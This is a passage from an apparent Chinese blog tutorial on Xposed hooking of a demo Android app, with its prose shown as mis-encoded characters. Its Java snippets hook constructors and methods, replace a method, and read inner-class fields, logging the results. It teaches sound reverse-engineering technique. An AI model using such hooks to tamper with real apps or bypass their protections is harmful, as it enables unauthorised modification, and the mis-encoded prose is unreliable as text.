å‡½æ•°ä¸­å¯¹åº”çš„å‚æ•°ç±»å‹ã€‚ï¼ˆå‚è€ƒå¦‚ä¸Šå›¾ç‰‡è§£æï¼‰</li><li>XposedHelpers.findAndHookConstructor(â€˜ç±»â€™ï¼Œâ€˜å‚æ•°åˆ—è¡¨â€™ï¼Œnew XC_MethodHook())</li><li>XC_MethodHook()æ–¹æ³•è¾“å…¥åä¼šè·³å‡ºä¸ªå¼¹çª—ï¼Œé€‰ä¸­è¿™ä¸¤ä¸ªã€‚<img src="/posts/947764cb.htm/image-20230714181900369.png" alt="image-20230714181900369"></li></ul><p>ç„¶ååœ¨ç”Ÿæˆçš„beforeHookedMethod()ï¼ŒafterHookedMethod()æ–¹æ³•å†…å†™é€»è¾‘å°±å¥½</p><ul><li>param.args[0]ï¼šparamæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œparam.args[0]æŒ‡å®šå‚æ•°çš„ç¬¬ä¸€ä¸ªæ•°æ®ã€‚</li></ul><h3 id="æ‰§è¡Œç»“æœ-2">æ‰§è¡Œç»“æœ</h3><ul><li>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230714182217127.png" alt="image-20230714182217127"></li></ul><h2 id="ä¸‰-Hookæ™®é€š-é™æ€æ–¹æ³•">ä¸‰.Hookæ™®é€š/é™æ€æ–¹æ³•</h2><h3 id="ç›®æ ‡ï¼šhookæ‰demoçš„æ™®é€šæ–¹æ³•image-20230714184958696">ç›®æ ‡ï¼šhookæ‰demoçš„æ™®é€šæ–¹æ³•<img src="/posts/947764cb.htm/image-20230714184958696.png" alt="image-20230714184958696"></h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-3">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;publicFunc&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;publicFunc is hooked before&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;publicFunc is hooked after&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>XposedHelpers.findAndHookMethod(Class&lt;?&gt; clazz, String methodName, Objectâ€¦ parameterTypesAndCallback):hookæ™®é€šæ–¹æ³•ï¼Œé™æ€æ–¹æ³•ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å’Œhookæ„é€ æ–¹æ³•å·®ä¸å¤šã€‚</li></ul><p>â€‹XposedHelpers.findAndHookMethod(â€˜ç±»â€™ï¼Œæ–¹æ³•åï¼Œâ€˜å‚æ•°åˆ—è¡¨â€™ï¼Œnew XC_MethodHook())</p><h3 id="æ‰§è¡Œç»“æœ-3">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<img src="/posts/947764cb.htm/image-20230714185618441.png" alt="image-20230714185618441"></p><h2 id="å››-Hookå¤æ‚å‚æ•°">å››.Hookå¤æ‚å‚æ•°</h2><h3 id="ç›®æ ‡ï¼šhookæ‰demoæœ‰å¤šä¸ªå‚æ•°çš„æ–¹æ³•">ç›®æ ‡ï¼šhookæ‰demoæœ‰å¤šä¸ªå‚æ•°çš„æ–¹æ³•</h3><p><img src="/posts/947764cb.htm/image-20230714212338332.png" alt="image-20230714212338332"></p><h3 id="ä»£ç å®ç°å¦‚ä¸‹-4">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;complexParameterFunc&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,<span class="comment">//String.class</span></span><br><span class="line">                <span class="string">&quot;[[Ljava.lang.String;&quot;</span>, <span class="comment">//String[][].class</span></span><br><span class="line">                <span class="string">&quot;java.util.Map&quot;</span>,</span><br><span class="line">                Class.forName(<span class="string">&quot;java.util.ArrayList&quot;</span>), <span class="comment">//&quot;java.util.ArrayList&quot;</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;complexParameterFunc is hooked before&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;complexParameterFunc is hooked after&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œä¸Šé¢hookæ™®é€šæ–¹æ³•ä¸€æ ·ï¼Œå°±æ˜¯å‚æ•°å¤šäº†ä¸€äº›ä»¥åŠæ‹“å±•äº†å‚æ•°åˆ—è¡¨çš„è¡¨è¾¾æ–¹å¼ï¼š</p><ul><li>â€œjava.lang.Stringâ€(Stringç±»è·¯å¾„)&quot;&lt;==&gt;String.class</li><li>â€œ[[Ljava.lang.String;â€(StringäºŒç»´æ•°ç»„çš„smaliå½¢å¼)</li><li>Class.forName(â€œjava.util.Mapâ€)â€œjava.util.Mapâ€(MapåŒ…è·¯å¾„)&lt;==&gt;Map.class</li><li>Class.forName(â€œjava.util.ArrayListâ€)&lt;==&gt;â€œjava.util.ArrayListâ€&lt;==&gt;ArrayList.class</li></ul><h3 id="æ‰§è¡Œç»“æœ-4">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230714220025533.png" alt="image-20230714220025533"></p><h2 id="äº”-Hookè‡ªå®šä¹‰ç±»å‚æ•°">äº”.Hookè‡ªå®šä¹‰ç±»å‚æ•°</h2><h3 id="ç›®æ ‡ï¼šhookæ‰demoä¸­çš„è‡ªå®šä¹‰ç±»å‚æ•°çš„æ–¹æ³•">ç›®æ ‡ï¼šhookæ‰demoä¸­çš„è‡ªå®šä¹‰ç±»å‚æ•°çš„æ–¹æ³•</h3><p><img src="/posts/947764cb.htm/image-20230715165947513.png" alt="image-20230715165947513"></p><h3 id="ä»£ç å®ç°å¦‚ä¸‹-5">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//æ–¹æ³•ä¸€</span></span><br><span class="line">        Class aniclazz=loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Animal&quot;</span>);</span><br><span class="line">        <span class="comment">//æ–¹æ³•äºŒ</span></span><br><span class="line">        <span class="comment">//Class aniclazz=XposedHelpers.findClass(&quot;com.xiaojianbang.xposeddemo.Animal&quot;,loadPackageParam.classLoader);</span></span><br><span class="line">        <span class="comment">//æ–¹æ³•ä¸‰</span></span><br><span class="line">        <span class="comment">//Class aniclazz=Class.forName(&quot;com.xiaojianbang.xposeddemo.Animal&quot;,false,loadPackageParam.classLoader)</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;Inner&quot;</span>,</span><br><span class="line">                aniclazz,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;è¿™æ˜¯è‡ªå®šä¹‰ç±»å‚æ•°çš„hook&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œå‰é¢ä¹Ÿå¤§å·®ä¸å·®ï¼Œä¸»è¦å°±æ˜¯å¤šäº†ä¸€ä¸ªè‡ªå·²å®šä¹‰çš„ç±»ï¼Œä¸èƒ½ä½¿ç”¨xxx.classæ–¹æ³•äº†ï¼Œè¿™é‡Œä½¿ç”¨å…ˆåŠ è½½ç±»ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªæ–¹æ³•ï¼š</p><ul><li>loadPackageParam.classLoader.loadClass(åŒ…+ç±»å)ï¼šåŠ è½½ç±»</li><li>XposedHelpers.findClass(â€œåŒ…+ç±»â€,loadPackageParam.classLoader);</li><li>Class.forName(â€œåŒ…+ç±»â€,false,loadPackageParam.classLoader)</li></ul><h3 id="æ‰§è¡Œç»“æœ-5">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo</p><p><img src="/posts/947764cb.htm/image-20230715172838293.png" alt="image-20230715172838293"></p><h2 id="å…­-Hookæ›¿æ¢å‡½æ•°">å…­.Hookæ›¿æ¢å‡½æ•°</h2><h3 id="ç›®æ ‡ï¼šhookæ‰ä¸€ä¸ªæ–¹æ³•çš„è¾“å‡ºå†…å®¹">ç›®æ ‡ï¼šhookæ‰ä¸€ä¸ªæ–¹æ³•çš„è¾“å‡ºå†…å®¹</h3><p><img src="/posts/947764cb.htm/image-20230715181604016.png" alt="image-20230715181604016"></p><h3 id="ä»£ç å®ç°å¦‚ä¸‹-6">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line"></span><br><span class="line">        XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;repleaceFunc&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;è¿™æ˜¯æ›¿æ¢ä¹‹åçš„è¾“å‡º&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>new XC_MethodReplacement():ç”¨æ¥hookä¿®æ”¹æ–¹æ³•</li></ul><h3 id="æ‰§è¡Œç»“æœ-6">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemoï¼Œå‘ç°æ²¡æœ‰è¾“å‡ºâ€™this is repleaceFunc logâ€™ï¼ŒhookæˆåŠŸ<br><img src="/posts/947764cb.htm/image-20230715181924016.png" alt="image-20230715181924016"></p><h2 id="ä¸ƒ-Hookå†…éƒ¨ç±»">ä¸ƒ.Hookå†…éƒ¨ç±»</h2><h3 id="ç›®æ ‡ï¼šhookå†…éƒ¨ç±»ï¼Œå¾—åˆ°å†…éƒ¨ç±»ä¸­çš„å®ä¾‹å¯¹è±¡">ç›®æ ‡ï¼šhookå†…éƒ¨ç±»ï¼Œå¾—åˆ°å†…éƒ¨ç±»ä¸­çš„å®ä¾‹å¯¹è±¡</h3><p><img src="/posts/947764cb.htm/image-20230715191405906.png" alt="image-20230715191405906"></p><h3 id="ä»£ç å®ç°å¦‚ä¸‹-7">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="type">int</span> aa=XposedHelpers.getIntField(param.thisObject,<span class="string">&quot;innerPublicInt&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;&quot;</span>+aa);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“è¿˜æ˜¯ä½¿ç”¨XposedHelpers.findAndHookMethod()æ–¹æ³•ï¼Œä½†æ˜¯å‚æ•°å˜åŒ–äº†ï¼Œå› ä¸ºç°åœ¨æ˜¯Demo$InnerClassç±»ä¸å†æ˜¯åŸæ¥çš„Demoç±»ã€‚</p><p>ä½¿ç”¨XposedHelpers.findClassæ–¹æ³•åŠ è½½ç±»Demo$InnerClass</p><ul><li>XposedHelpers.getIntField(Object obj, String fieldName)ï¼šå¾—åˆ°intå‹å­—æ®µ</li><li>param.thisObjectï¼šæˆ‘ä»¬é€šè¿‡è°ƒç”¨paramå¯¹è±¡çš„thisObjectå±æ€§è·å–å½“å‰æ–¹æ³•æ‰€å±çš„ç±»çš„å®ä¾‹</li></ul><h3 id="æ‰§è¡Œç»“æœ-7">æ‰§è¡Œç»“æœ</h3><p>è¿è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230715195241921.png" alt="image-20230715195241921"></p><h2 id="å…«-ä¸»åŠ¨è°ƒç”¨">å…«.ä¸»åŠ¨è°ƒç”¨</h2><h3 id="ç›®æ ‡ï¼šhookä¸»åŠ¨è°ƒç”¨image-20230715213038516">ç›®æ ‡ï¼šhookä¸»åŠ¨è°ƒç”¨<img src="/posts/947764cb.htm/image-20230715213038516.png" alt="image-20230715213038516"></h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-8">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span 